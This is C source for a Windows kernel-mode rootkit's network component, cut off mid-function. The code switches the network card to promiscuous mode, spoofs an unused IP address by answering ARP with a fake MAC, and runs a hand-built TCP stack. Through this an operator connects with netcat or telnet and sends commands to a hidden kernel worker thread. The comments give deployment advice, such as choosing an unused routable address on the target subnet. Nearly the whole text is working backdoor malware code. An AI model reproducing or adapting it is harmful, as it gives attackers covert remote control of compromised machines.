
#include "rk_driver.h"
#include "rk_packet.h"

//////////////////////////////////////////////////////////////////////////////////////
// this file handles all packet I/O operations for the rootkit, including a
// rudimentary TCP/IP stack.  The TCP/IP stack is a hack at best and uses a global
// packet buffer along with tracking ACK/SYNC numbers.  It has been tested and works
// with many clients in the lab.  Connecting to this over a long-distance link has
// NOT been tested.  Also, some MS TCP/IP stacks don't get along with it.  NetCat works
// fine from a linux box we tested.  Telnet works also, but rootkit doesn't handle the
// telnet IAC sequences.
//
// The rootkit spoofs an IP address of your choosing.  Currently, you must compile this
// IP address into the rootkit.  (you can hexedit-patch it also)
//
// When an ARP request is made for the spoofed IP address, rootkit responds with a
// fake ethernet address of 0xDEADBEEFDEAD.  ALL packets destined for this MAC address
// will be handled as part of the rootkit session.  This means you can telnet to the
// rootkit, any port.  Source and destination TCP ports are IGNORED - so you can create
// some creative packets in order to connect to the rootkit.
//
// The spoofed IP address you choose be routable to your target, in other words, pick
// an unused address in the subnet your rootkit lives.  UNUSED ip is important, or
// else rootkit will respond to ARP's along with the real IP - and we have a bad sort
// of competition going on. ;-)
//
// -Greg
//
//////////////////////////////////////////////////////////////////////////////////////

//-------------------------------------------
// HARD CODE FOR TARGET
// this is the IP address we want to use for
// the rootkit.
//
// 0xA600000A == 10.0.0.166
//-------------------------------------------
#define SPOOFED_IP 0xA600000A

// our rootkit ethernet address - this is hardcoded elsewhere in places
// so if you want to change it, hunt them down.
static u_char demon_addr[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD };

//win2k barfs unless this is crufted out
#if defined(NdisFreePacket)
#undef NdisFreePacket

VOID
NdisFreePacket(
   IN PNDIS_PACKET Packet
   );

#endif

/* ________________________________________________________________________________
 . This constant is used for places where NdisAllocateMemory
 . needs to be called and the HighestAcceptableAddress does
 . not matter.
 . ________________________________________________________________________________ */
NDIS_PHYSICAL_ADDRESS HighestAcceptableMax =
    NDIS_PHYSICAL_ADDRESS_CONST(-1,-1);

BFRF GlobalPtrArray[MAX_POSITIONS]; /* max recv packets waiting */
ULONG GPFront = 0;

// for maintaing TCP session
DWORD g_SYNC = 0;
DWORD g_ACK = 0;
// this is a global 'return' packet 
static char g_transaction_packet[1600];
DWORD g_transaction_len = 0;				

struct ether_header *ret_ep = NULL;
struct iphdr *ret_ih = NULL;
struct tcphdr *ret_tp = NULL;


//input from client will be stored in this little string
//and a little counter
char g_remote_command[256];
u_char g_command_index = 0; 
extern char g_command_signal[256]; //to send commands to the worker thread
extern KEVENT command_signal_event;

unsigned short htons(unsigned short a)
{
	unsigned short b = a;
	b *= 0x100;
	a /= 0x100;
	return(a+b);
}

unsigned short ntohs(unsigned short a)
{
	unsigned short b = a;
	b *= 0x100;
	a /= 0x100;
	return(a+b);
}

unsigned long htonl(unsigned long a)
{
	unsigned short u = a / 0x10000;
	unsigned short l = a & 0x0000FFFF;
	u = htons(u);
	l = htons(l);
    a = 0x10000 * l;
	return(a+u);
}

unsigned long ntohl(unsigned long a)
{
	unsigned short u = a / 0x10000;
	unsigned short l = a & 0x0000FFFF;
	u = htons(u);
	l = htons(l);
    a = 0x10000 * l;
	return(a+u);
}
						
unsigned short ip_sum(unsigned short *ptr,int nbytes) 
{
	register long           sum;            /* assumes long == 32 bits */
	u_short                 oddbyte;
	register u_short        answer;         /* assumes u_short == 16 bits */

	/*
	 * Our algorithm is simple, using a 32-bit accumulator (sum),
	 * we add sequential 16-bit words to it, and at the end, fold back
	 * all the carry bits from the top 16 bits into the lower 16 bits.
	 */

	sum = 0;
	while (nbytes > 1)  {
	sum += *ptr++;
	nbytes -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nbytes == 1) {
	oddbyte = 0;            /* make sure top half is zero */
	*((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
	sum += oddbyte;
	}

	/*
	 * Add back carry outs from top 16 bits to low 16 bits.
	 */

	sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
	sum += (sum >> 16);                     /* add carry */
	answer = ~sum;          /* ones-complement, then truncate to 16 bits */
	return(answer);
}

void tcp_sum(struct iphdr *ih, struct tcphdr *tp, u_long theDataLen)
{
	u_char *aScratchHeader = ExAllocatePool(NonPagedPool, theDataLen);
	if(tp && aScratchHeader)
	{
		// ASSERT(0 == tp->th_sum);
		int hlen = ih->ip_hl << 2; /* use this value in case there are IP options */
		int ip_len = theDataLen - sizeof (struct ether_header);

		int tcp_len = ip_len - hlen; // equals total tcp header + data
		int tcp_headerlen = (tp->th_off * 4);
		
		int buflen = sizeof(struct pseudo_header);
		buflen += tcp_len;
		
		((struct pseudo_header *)aScratchHeader)->source_address = ih->ip_src;
		((struct pseudo_header *)aScratchHeader)->dest_address = ih->ip_dst;
		((struct pseudo_header *)aScratchHeader)->placeholder = 0;
		((struct pseudo_header *)aScratchHeader)->protocol = IPPROTO_TCP;
		((struct pseudo_header *)aScratchHeader)->tcp_length = htons(tcp_len);
		memcpy(	(aScratchHeader + sizeof(struct pseudo_header)), 
				tp, 
				tcp_len);
		tp->th_sum = ip_sum( (unsigned short *) aScratchHeader, 
									sizeof(struct pseudo_header) + tcp_len );
		ExFreePool(aScratchHeader);
	}
}


/* ______________________________________________________________________
 . Send raw data over the network.  Use this function to send a frame of
 . data out over the wire.  If you expect the packet to get anywhere, you
 . will, of course, need to assemble a valid TCP/IP packet, as well as the
 . Ethernet frame.  It is suggested that you use something like ICMP 
 . or UDP to communicate - and ignore trying to keep a TCP session open.
 . Otherwise, you are going to have to implement your own TCP stack inside
 . this driver (echk!).
 . ______________________________________________________________________ */
VOID SendRaw(char *c, int len)
{
	NDIS_STATUS aStat;
	
	DbgPrint("ROOTKIT: SendRaw called\n");

	/* aquire lock, release only when send is complete */
	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);
	if(gOpenInstance && c){
		PNDIS_PACKET aPacketP;
		NdisAllocatePacket( &aStat, 
							&aPacketP, 
							gOpenInstance->mPacketPoolH
							);
		if(NDIS_STATUS_SUCCESS == aStat)
		{
			PVOID aBufferP;
			PNDIS_BUFFER anNdisBufferP;

			NdisAllocateMemory( &aBufferP,
								len,
								0,
								HighestAcceptableMax );
			memcpy( aBufferP, (PVOID)c, len);
			NdisAllocateBuffer( &aStat, 
								&anNdisBufferP, 
								gOpenInstance->mBufferPoolH,
								aBufferP,
								len
								);
			if(NDIS_STATUS_SUCCESS == aStat)
			{
				RESERVED(aPacketP)->Irp = NULL; /* so our OnSendDone() knows this is local */
				NdisChainBufferAtBack(aPacketP, anNdisBufferP);	
				NdisSend( &aStat, gOpenInstance->AdapterHandle, aPacketP );
				if (aStat != NDIS_STATUS_PENDING ) 
				{
					OnSendDone( gOpenInstance, aPacketP, aStat );
				}			
			}
			else
			{
				DbgPrint("rootkit: error 0x%X NdisAllocateBuffer\n");
			}
		}
		else
		{
			DbgPrint("rootkit: error 0x%X NdisAllocatePacket\n");
		}
	}
	/* release so we can send next.. */
	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
}

void RespondToArp(struct in_addr sip, struct in_addr tip, __int64 enaddr)
{
	struct ether_header *eh;
	struct ether_arp *ea;
	struct sockaddr sa;
	struct pps *pp = NULL;
	__int64 our_mac = 0xADDEEFBEADDE; //deadbeefdead

	ea = ExAllocatePool(NonPagedPool,sizeof(struct ether_arp));
	memset(ea, 0, sizeof (struct ether_arp));

	eh = (struct ether_header *)sa.sa_data;
	
	(void)memcpy(eh->h_dest, &enaddr, sizeof(eh->h_dest));
	(void)memcpy(eh->h_source, &our_mac, sizeof(eh->h_source));
	
	eh->h_proto = htons(ETH_P_ARP);		/* if_output will not swap */
	
	ea->arp_hrd = htons(ARPHRD_ETHER);
	ea->arp_pro = htons(ETH_P_IP);
	ea->arp_hln = sizeof(ea->arp_sha);	/* hardware address length */
	ea->arp_pln = sizeof(ea->arp_spa);	/* protocol address length */
	
	ea->arp_op = htons(ARPOP_REPLY);
	
	(void)memcpy(ea->arp_sha, &our_mac, sizeof(ea->arp_sha));
	(void)memcpy(ea->arp_tha, &enaddr, sizeof(ea->arp_tha));

	(void)memcpy(ea->arp_spa, &sip, sizeof(ea->arp_spa));
	(void)memcpy(ea->arp_tpa, &tip, sizeof(ea->arp_tpa));
	
	pp = ExAllocatePool(NonPagedPool,sizeof(struct pps));
	memcpy(&(pp->eh), eh, sizeof(struct ether_header));
	memcpy(&(pp->ea), ea, sizeof(struct ether_arp));
	
	SendRaw((char *)pp, sizeof(struct pps)); //send raw packet over default interface
	ExFreePool(pp);
	ExFreePool(ea);
}


///////////////////////////////////////////////////////////////////
// send data to the client.
//
// When we send the data, we are playing with a globally stored
// packet buffer.  This buffer can be accessed from multiple 
// htreads so it MUST be spinlocked.
///////////////////////////////////////////////////////////////////
void ReturnDataToClient(char *theClientData, int theClientLen)
{
	///////////////////////////////////////////////////////////////
	// we use the packet that is stored globally
	// we need to make a safe copy of the packet so we can send it
	// over the wire.  NEVER send the global packet directly - 
	// because the sniffer callback may be writing to it at the same
	// time.  We use the same spinlock in SendRaw as we do to 
	// protect this buffer - so calling SendRaw WHILE we are 
	// spinlocked will cause a DEADLOCK - and that is a Bad Thing.
	// -Greg
	///////////////////////////////////////////////////////////////
	char aPacketToSend[1600]; //stack sow
	int aPacketLen = 0;
	
	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);
	
	if( (0 != g_transaction_len)
		&& 
		(g_transaction_len <= 1514))
	{
		int tcp_len;
		char *theDataPayload;
		int theNewTotalLen;
		int hlen;
		char _c[255];
		
		hlen = ret_ih->ip_hl << 2; /* use this value in case there are IP options */
		tcp_len = ret_tp->th_off * 4;
		theDataPayload = (char *)(((char *)g_transaction_packet) + sizeof(struct ether_header) + hlen + tcp_len );	
		theNewTotalLen = theClientLen + ( sizeof(struct ether_header) + hlen + tcp_len );
		
		// write data into the TCP payload and adjust sizes
		memcpy(theDataPayload, theClientData, theClientLen);

		ret_tp->th_seq = htonl(g_SYNC);
		ret_tp->th_ack = htonl(g_ACK);
		g_SYNC += theClientLen;

		// set the ip total length field
		ret_ih->ip_len = htons(theNewTotalLen - sizeof(struct ether_header));

		sprintf(_c, "rootkit: packet bang sending data len %d\n", g_transaction_len);
		DbgPrint(_c);
	
		ret_tp->th_sum = 0;
		ret_ih->ip_sum = 0;
	
		// calculate checksums
		tcp_sum( ret_ih, ret_tp, theNewTotalLen );
		ret_ih->ip_sum = ip_sum ((unsigned short *) ret_ih, sizeof (struct iphdr) );
		
		g_transaction_len = theNewTotalLen;

		aPacketLen = theNewTotalLen;
		memcpy(aPacketToSend, g_transaction_packet, 1600);
	}
	else
	{
		// no client connected?
	}

	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);

	// safe to call SendRaw outside of the SpinLock
	if(aPacketLen) SendRaw(aPacketToSend, aPacketLen);
}



///////////////////////////////////////////////////////////////////
// perform TCP/IP transactions
///////////////////////////////////////////////////////////////////
void OnSessionPacket(const char* theData, int theLen)
{
	char _c[255];
	sprintf(_c, "rootkit: packet OnSessionPacket, len %d\n", theLen);
	DbgPrint(_c);
	
	if(theLen > sizeof(struct ether_header) + sizeof(struct iphdr))
	{
		struct ether_header *ep = (struct ether_header *)theData;
		if(ep)
		{ 
			switch(ntohs(ep->h_proto))
			{
			case ETH_P_RARP:
			case ETH_P_ARP:
				sprintf(_c, "rootkit: packet ARP\n");
				DbgPrint(_c);
									
				// check for rootkit IP to make ARP response
				if(theLen >= sizeof(struct ether_header) + sizeof(struct ether_arp))
				{
					struct ether_header *eh = (struct ether_header *)theData;
					struct ether_arp *ea = (struct ether_arp *)( ((char *)theData) + sizeof(struct ether_header));
			
					struct in_addr sender_addy;
					struct in_addr target_addy;
			
					memcpy(&sender_addy, ea->arp_spa, 4);
					memcpy(&target_addy, ea->arp_tpa, 4);
				
					if(ea->arp_op == htons(ARPOP_REQUEST))
					{
						sprintf(_c, "rootkit: packet ARP REQUEST\n");
						DbgPrint(_c);
									
						
						if(target_addy.S_un.S_addr == SPOOFED_IP)
						{
							// this is for the rootkit!
							__int64 em; 
							
							DbgPrint("rootkit: packet responding to ARP\n");
							memcpy(&em, ea->arp_sha, 6);
							em &= 0x0000FFFFFFFFFFFF;
							RespondToArp( target_addy, sender_addy, em); 					
						}
					}
				}
				break;
			case ETH_P_IP:
				sprintf(_c, "rootkit: packet IP");
				DbgPrint(_c);
									
				if(theLen >= sizeof(struct ether_header) + sizeof(struct iphdr))
				{
					struct iphdr *ih = (struct iphdr *) ( ((char *)ep) + sizeof(struct ether_header));
					if(theLen > sizeof( struct ether_header) + sizeof( struct iphdr) + sizeof( struct tcphdr))
					{
						if(ih)
						{
							int hlen = ih->ip_hl << 2; /* use this value in case there are IP options */
							short of = ntohs(ih->ip_off);
							if( of & 0x01FF)
							{
								char _c[255];
								sprintf(_c, "rootkit: packet IP fragmented, offset field: %u\n", of & 0x01FF);
								DbgPrint(_c);
							}
							else if(IPPROTO_TCP == ih->ip_p) 
							{	
								struct tcphdr *tp = (struct tcphdr *) ( ((char *)ih) + hlen );
								if(tp)
								{
									///////////////////////////////////////////////////////////////////
									// we have a TCP packet
									//
									///////////////////////////////////////////////////////////////////	
									u_short src = ntohs(tp->th_sport);
									u_short dst = ntohs(tp->th_dport);
									int tcp_len = tp->th_off * 4;
									char *theDataPayload = (char *)(((char *)theData) + sizeof(struct ether_header) + hlen + tcp_len );	
									int theTotalPayloadLEN = theLen - ( sizeof(struct ether_header) + hlen + tcp_len );
									
									////////////////////////////////////////////////////////////////////
									// some windoze TCP/IP stacks return garbage at the end of the
									// packet, so check against the IP total length - use the lesser
									// value.
									////////////////////////////////////////////////////////////////////

									int ip_given_len = htons(ih->ip_len);
									ip_given_len -= (tcp_len + hlen);

									if(theTotalPayloadLEN > ip_given_len)
										theTotalPayloadLEN = ip_given_len;

									sprintf(_c, "rootkit: packet tcp, src: %d, dst:%d total_len: %d\n", src, dst, theTotalPayloadLEN);
									DbgPrint(_c);
									
									if(0 == memcmp( &(ep->h_dest), demon_addr, 6))
									{
										/////////////////////////////////////
										// this packet is destination rootkit
										//
										// keep a return packet in our static
										// buffer.
										/////////////////////////////////////
										
										/////////////////////////////////////
										// get the important TCP/IP values
										/////////////////////////////////////
										u_long dst_ip; 
										u_long src_ip; 
										__int64 es;
										__int64 ed;
										u_short dst_port = tp->th_sport;
										u_short src_port = tp->th_dport;

										memcpy( &dst_ip, &(ih->ip_src), 4);
										memcpy( &src_ip, &(ih->ip_dst), 4);
										memcpy( &es, &(ep->h_dest), 6);
										memcpy( &ed, &(ep->h_source), 6);

										/////////////////////////////////////
										// create our return packet
										/////////////////////////////////////
										if(theLen <= 1514)
										{
											sprintf(_c, "rootkit: packet bang filling ret buffer\n");
											DbgPrint(_c);

											memcpy( g_transaction_packet, theData, theLen );
											g_transaction_len = theLen;

											ret_ep = (struct ether_header *)g_transaction_packet;
											ret_ih = (struct iphdr *)((char *)ret_ep + ((char *)ih - (char *)ep));
											ret_tp = (struct tcphdr *)((char *)ret_ih + ((char *)tp - (char *)ih));
										}
										/////////////////////////////////////
										// copy improtant values into our return
										// packet.
										/////////////////////////////////////
										sprintf(_c, "rootkit: packet bang DEADBEEF\n");
										DbgPrint(_c);

										memcpy( &(ret_ep->h_dest), &ed, 6);
										memcpy( &(ret_ep->h_source), &es, 6);
										memcpy(&(ret_ih->ip_dst), &dst_ip, 4);
										memcpy(&(ret_ih->ip_src), &src_ip, 4);
										ret_tp->th_dport = dst_port;
										ret_tp->th_sport = src_port;
										
										///////////////////////////////////////////////
										// now we should be able to send data back to
										// client.
										///////////////////////////////////////////////
										
										if(tp->th_flags == TH_SYN)
										{
											sprintf(_c, "rootkit: packet bang SYN\n");
											DbgPrint(_c);

											//////////////////////////////////////////
											// SYN packet causes reset of our counters
											// - respond SYNACK
											// init the seq numbers
											/////////////////////////
											g_ACK = ntohl(tp->th_seq);
											g_SYNC = 0;

											ret_tp->th_flags = (TH_SYN | TH_ACK);
											
											// increment ACK
											g_ACK++;
											ret_tp->th_ack = htonl(g_ACK);
											ret_tp->th_seq = g_SYNC;

											sprintf(_c, "rootkit: packet bang firing SYNACK\n");
											DbgPrint(_c);
										
											ret_tp->th_sum = 0;
											ret_ih->ip_sum = 0;

											// calculate checksums
											tcp_sum( ret_ih, ret_tp, theLen );
											ret_ih->ip_sum = ip_sum ((unsigned short *) ret_ih, sizeof (struct iphdr) );
											SendRaw(g_transaction_packet, theLen);

											//this is our prompt, an upside-down question-mark ¿
											ReturnDataToClient("\xA8", 1);
										}
										else if(theTotalPayloadLEN)
										{
											// we have some data, per TCP rules,
											// ack their sequence number PLUS
											// the number of bytes we are sending
											//
											// use their ACK field for a SEQ number
											g_ACK = ntohl(tp->th_seq);
											g_ACK += theTotalPayloadLEN;
											g_SYNC = htonl(tp->th_ack);
											ret_tp->th_seq = htonl(g_SYNC);
											ret_tp->th_ack = htonl(g_ACK);
											g_SYNC += theTotalPayloadLEN;

											// echo packet back
											sprintf(_c, "rootkit: packet bang echoing payload %c\n", theDataPayload[0]);
											DbgPrint(_c);
										
											ret_tp->th_sum = 0;
											ret_ih->ip_sum = 0;
										
											// calculate checksums
											tcp_sum( ret_ih, ret_tp, theLen );
											ret_ih->ip_sum = ip_sum ((unsigned short *) ret_ih, sizeof (struct iphdr) );
											
											///////////////////////////////////////
											// because we are using theLen, any
											// garbage from MS win stacks will
											// be returned in packet.  I tried to
											// correct this above, but we are still
											// having trouble working with some
											// MS TCP/IP stacks.  Some work, some
											// don't.
											///////////////////////////////////////
											SendRaw(g_transaction_packet, theLen);
										
											//process the character(s)
											if((theTotalPayloadLEN + g_command_index) < 255)
											{
												memcpy(&g_remote_command[g_command_index], theDataPayload, theTotalPayloadLEN);
												//now check for carriage-returns
												while(theTotalPayloadLEN--)
												{ 
													if( (g_remote_command[g_command_index] == '\x0A')
														||
														(g_remote_command[g_command_index] == '\x0D') )
													{
														//---------------------------------------------
														// command terminator detected:
														// we will now move the buffer into the global
														// command string via a protected spinlock and
														// then notify the worker thread that a command
														// needs to be processed.
														//
														// The worker thread is running as IRQL_PASSIVE
														// which is required for many of the NT Kernel
														// API calls.  *this* thread is running as
														// IRQL_DISPATCH, which will BSOD the machine if
														// we try to make API calls from here.
														//
														// I'll say this again: DO NOT make kernel API 
														// calls from *this* thread!
														//----------------------------------------------
														char command[256];
														KIRQL aIrqL;

														memset(command, NULL, 255);
														memcpy(command, &g_remote_command[0], g_command_index);
														
														// trim any trailing linefeed or null
														// this could be better optimized, but it works
														// for now.
														if( (command[g_command_index-1] == '\x0D')
															||
															(command[g_command_index-1] == '\x0A')
															||
															(command[g_command_index-1] == '\x00') )
														{
															command[g_command_index-1] = NULL;
															g_command_index++; //forward past bad character
														}

														//----[ spinlock ]-------------------------------
														KeAcquireSpinLock(&GlobalArraySpinLock, &aIrqL);
														memcpy(g_command_signal, command, 255);
														KeReleaseSpinLock(&GlobalArraySpinLock, aIrqL);
														//-----------------------------------------------
														KeSetEvent(&command_signal_event, 1, FALSE);

														//reset ptr and pack-up any remaining data after
														//the delimiter.
														memset(command, NULL, 255);
														memcpy(command, &g_remote_command[g_command_index], 254-g_command_index);
														memcpy(&g_remote_command[0], command, 254-g_command_index);
														g_command_index=0;
														break;
													}
													g_command_index++;
												}
											}
										}
									}
								}
							}							
						}
					}
				}
			break;
			default:
			break;
			}
		}
	}
	return;
}


/* NOTE:
 * There are alot of functions that should be dealing with IRP's, 
 * but since this rootkit is not currently accessable to user-mode, 
 * all of this is irrelevant .. so I leave most of the IRP processing 
 * out for now... 
 */


NTSTATUS 
OnWrite( IN PDEVICE_OBJECT theDevObj, IN PIRP theIrp ) 
{
    PIO_STACK_LOCATION  anIrpStackP;
    PNDIS_PACKET        pPacket;
    NDIS_STATUS         aStatus;

	DbgPrint("ROOTKIT: OnWrite called \n");

    anIrpStackP = IoGetCurrentIrpStackLocation(theIrp);

    NdisAllocatePacket( &aStatus, &pPacket, gOpenInstance->mPacketPoolH );
    if (aStatus != NDIS_STATUS_SUCCESS) 
	{
        theIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
        IoCompleteRequest(theIrp, IO_NO_INCREMENT);
		return STATUS_UNSUCCESSFUL;
    }

    RESERVED(pPacket)->Irp=theIrp;
    NdisChainBufferAtFront(pPacket,theIrp->MdlAddress);

    IoMarkIrpPending(theIrp);
    theIrp->IoStatus.Status = STATUS_PENDING;
    /* send the data down to the MAC driver */
    NdisSend( &aStatus, gOpenInstance->AdapterHandle, pPacket);
    if (aStatus != NDIS_STATUS_PENDING) 
	{
        OnSendDone( gOpenInstance, pPacket, aStatus );
    }
    return(STATUS_PENDING);
}

VOID 
OnOpenAdapterDone( IN NDIS_HANDLE ProtocolBindingContext, 
				   IN NDIS_STATUS Status, 
				   IN NDIS_STATUS OpenErrorStatus ) 
{
    PIRP              Irp = NULL;
    POPEN_INSTANCE    Open = NULL;
	NDIS_REQUEST      anNdisRequest;
	BOOLEAN           anotherStatus;
	ULONG			  aMode = NDIS_PACKET_TYPE_PROMISCUOUS;

	DbgPrint("ROOTKIT: OnOpenAdapterDone called\n");

	/* set card into promiscuous mode */
	if(gOpenInstance){
		//
		//	Initializing the Event
		//
		NdisInitializeEvent(&gOpenInstance->Event);

		anNdisRequest.RequestType = NdisRequestSetInformation;
		anNdisRequest.DATA.SET_INFORMATION.Oid = OID_GEN_CURRENT_PACKET_FILTER;
		anNdisRequest.DATA.SET_INFORMATION.InformationBuffer = &aMode;
		anNdisRequest.DATA.SET_INFORMATION.InformationBufferLength = sizeof(ULONG);

		NdisRequest( &anotherStatus,
					 gOpenInstance->AdapterHandle,
					 &anNdisRequest
					 );
	}
    return;
}


VOID 
OnCloseAdapterDone( IN NDIS_HANDLE ProtocolBindingContext, 
				    IN NDIS_STATUS Status ) 
{
	DbgPrint("ROOTKIT: OnCloseAdapterDone called\n");

	if(NULL != gOpenInstance)
	{
		gOpenInstance->Status = Status;
		NdisSetEvent(&gOpenInstance->Event);
	}
    return;
}

VOID 
OnSendDone( IN NDIS_HANDLE ProtocolBindingContext, 
		    IN PNDIS_PACKET pPacket, 
			IN NDIS_STATUS Status ) 
{
    PNDIS_BUFFER anNdisBufferP;
	PVOID aBufferP;
	UINT aBufferLen;
	PIRP Irp;
    

	DbgPrint("ROOTKIT: OnSendDone called\n");

	//__asm int 3

	/* aquire lock, release only when send is complete */
	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);

	Irp=RESERVED(pPacket)->Irp;
	if(Irp)
	{
		NdisReinitializePacket(pPacket);
		NdisFreePacket(pPacket);

		Irp->IoStatus.Status = NDIS_STATUS_SUCCESS;
		Irp->IoStatus.Information = 0; /* never reports back anything sent.. */ 
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
	}
	else
	{
		// if no Irp, then it was local
		NdisUnchainBufferAtFront( pPacket,
								  &anNdisBufferP );
		if(anNdisBufferP)
		{
			NdisQueryBuffer( anNdisBufferP,
							 &aBufferP,
							 &aBufferLen);
			if(aBufferP)
			{
				NdisFreeMemory( aBufferP,
								aBufferLen,
								0 );
			}
			NdisFreeBuffer(anNdisBufferP);
		}
		NdisReinitializePacket(pPacket);
		NdisFreePacket(pPacket);
	}

	/* release so we can send next.. */
	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);

    return;
}

VOID 
OnTransferDataDone ( IN NDIS_HANDLE thePBindingContext, 
					 IN PNDIS_PACKET thePacketP, 
					 IN NDIS_STATUS theStatus, 
					 IN UINT theBytesTransfered ) 
{
	PIO_STACK_LOCATION   anIrpStackP;
	PNDIS_BUFFER		 aNdisBufP;
	PVOID			     aBufferP;
	ULONG				 aBufferLen;
	PVOID			     aHeaderBufferP;
	ULONG				 aHeaderBufferLen;
    POPEN_INSTANCE       anOpenP;
    PIRP                 anIrpP;
    PMDL                 aMdlP;
	

	DbgPrint("ROOTKIT: OnTransferDataDone called\n");

	/////////////////////////////////////////////////////////////////////
	// we have a complete packet here, so process internally
	/////////////////////////////////////////////////////////////////////
	
	//__asm int 3

	aBufferP = RESERVED(thePacketP)->pBuffer;
	aBufferLen = theBytesTransfered;
	aHeaderBufferP = RESERVED(thePacketP)->pHeaderBufferP;
	aHeaderBufferLen = RESERVED(thePacketP)->pHeaderBufferLen;

	/////////////////////////////////////////////////////////////////////
	// aHeaderBufferP should be the Ethernet Header
	// aBufferP should be the TCP/IP packet
	/////////////////////////////////////////////////////////////////////
	if(aBufferP && aHeaderBufferP)
	{
		ULONG aPos = 0;
		KIRQL aIrql;
		char *aPtr = NULL;

		// note: I removed some code that was dumping these packets into a
		// global array.  Since this is removed, I have also removed the
		// spinlock.  This should be OK. -Greg

		//KeAcquireSpinLock(&GlobalArraySpinLock, &aIrql);
		// ----------------------------------------------------------
		aPtr = ExAllocatePool(NonPagedPool, (aHeaderBufferLen + aBufferLen) );
		if(aPtr)
		{
			memcpy( aPtr,
				    aHeaderBufferP,
					aHeaderBufferLen );
			memcpy( aPtr + aHeaderBufferLen,
					aBufferP,
					aBufferLen );
			/////////////////////////////////////////////////////
			// we have a complete packet ready to examine
			/////////////////////////////////////////////////////
			
			// first parse this packet for embedded commands
			OnSniffedPacket(aPtr, (aHeaderBufferLen + aBufferLen));
			
			// now perform TELNET transactions if needed
			OnSessionPacket(aPtr, (aHeaderBufferLen + aBufferLen));
			
			ExFreePool(aPtr);	
		}
		// ------------------------------------------------------
		//KeReleaseSpinLock(&GlobalArraySpinLock, aIrql);
		
		
		DbgPrint("ROOTKIT: OTDD: Freeing Packet Memory\n");
		ExFreePool(aBufferP); // we are full
		ExFreePool(aHeaderBufferP); // we are full		
	}

	/* free buffer */
	DbgPrint("ROOTKIT: OTDD: NdisUnchainBufferAtFront\n");
	NdisUnchainBufferAtFront(thePacketP, &aNdisBufP); // Free buffer descriptor.
    if (aNdisBufP) NdisFreeBuffer(aNdisBufP);

    /* recycle */
	DbgPrint("ROOTKIT: OTDD: NdisReinitializePacket\n");
    NdisReinitializePacket(thePacketP);
    NdisFreePacket(thePacketP);
    return;
}


VOID OnResetDone( IN NDIS_HANDLE ProtocolBindingContext, 
				  IN NDIS_STATUS Status ) 
{   
	DbgPrint("ROOTKIT: OnResetDone called\n");
    return;
}

VOID 
OnRequestDone( IN NDIS_HANDLE ProtocolBindingContext, 
			   IN PNDIS_REQUEST NdisRequest, 
			   IN NDIS_STATUS Status ) 
{
	DbgPrint("ROOTKIT: OnRequestDone called\n");
    return;
}


/* a packet has arrived */
NDIS_STATUS 
OnReceiveStub( IN NDIS_HANDLE ProtocolBindingContext, /* our open structure */
			   IN NDIS_HANDLE MacReceiveContext, 
			   IN PVOID HeaderBuffer, /* ethernet header */
			   IN UINT HeaderBufferSize, 
			   IN PVOID LookAheadBuffer, /* it is possible to have entire packet in here */
			   IN UINT LookaheadBufferSize, 
			   UINT PacketSize ) 
{
	POPEN_INSTANCE      Open;

    PNDIS_PACKET        pPacket;
    PNDIS_BUFFER		pBuffer;

	ULONG               SizeToTransfer = 0;
    NDIS_STATUS         Status;
    UINT                BytesTransfered;
    ULONG               BufferLength;

    PPACKET_RESERVED    Reserved;
	NDIS_HANDLE			BufferPool;
	PVOID				aTemp;
	UINT				Frame_Type = 0;
	
	DbgPrint("ROOTKIT: OnReceiveStub called\n");
	//__asm int 3

	SizeToTransfer = PacketSize;    
    Open = (POPEN_INSTANCE) ProtocolBindingContext;

    if ((HeaderBufferSize > ETHERNET_HEADER_LENGTH) 
		|| 
		(SizeToTransfer > (1514 - ETHERNET_HEADER_LENGTH) ))
	{
		DbgPrint("ROOTKIT: OnReceiveStub returning unaccepted packet\n");
        return NDIS_STATUS_NOT_ACCEPTED;
	}

#if 0 // NOTE we need to get arp results back
	memcpy(&Frame_Type, ( ((char *)HeaderBuffer) + 12), 2);
	/*
	 * ignore everything 
	 * except IP (network byte order) 
	 */
	if(Frame_Type != 0x0008)
	{
		return NDIS_STATUS_NOT_ACCEPTED; 
	}
#endif
	
	/* store ethernet payload */
	
	aTemp = ExAllocatePool( NonPagedPool, (1514 - ETHERNET_HEADER_LENGTH ));
	if(aTemp)
	{
		
		DbgPrint("ROOTKIT: ORI: store ethernet payload\n");
		RtlZeroMemory( aTemp, (1514 - ETHERNET_HEADER_LENGTH ));
		NdisAllocatePacket(
			&Status,
			&pPacket,
			Open->mPacketPoolH /* previous NdisAllocatePacketPool */
			);
		if (NDIS_STATUS_SUCCESS == Status)
		{
			DbgPrint("ROOTKIT: ORI: store ethernet header\n");
			/* store ethernet header */
			RESERVED(pPacket)->pHeaderBufferP = ExAllocatePool(NonPagedPool, ETHERNET_HEADER_LENGTH);
			DbgPrint("ROOTKIT: ORI: checking ptr\n");
			if(RESERVED(pPacket)->pHeaderBufferP)
			{
				DbgPrint("ROOTKIT: ORI: pHeaderBufferP\n");
				RtlZeroMemory(RESERVED(pPacket)->pHeaderBufferP, ETHERNET_HEADER_LENGTH);
				memcpy(RESERVED(pPacket)->pHeaderBufferP, (char *)HeaderBuffer, ETHERNET_HEADER_LENGTH);
				RESERVED(pPacket)->pHeaderBufferLen = ETHERNET_HEADER_LENGTH;
				NdisAllocateBuffer(
					&Status,
					&pBuffer,
					Open->mBufferPoolH,
					aTemp,
					(1514 - ETHERNET_HEADER_LENGTH)
					);

				if (NDIS_STATUS_SUCCESS == Status)
				{
					DbgPrint("ROOTKIT: ORI: NDIS_STATUS_SUCCESS\n");
					RESERVED(pPacket)->pBuffer = aTemp; /* I have to release this later */

					/*  Attach our buffer to the packet.. important */
					NdisChainBufferAtFront(pPacket, pBuffer);

					DbgPrint("ROOTKIT: ORI: NdisTransferData\n");
					NdisTransferData(
						&(Open->mStatus),
						Open->AdapterHandle,
						MacReceiveContext,
						0,
						SizeToTransfer,
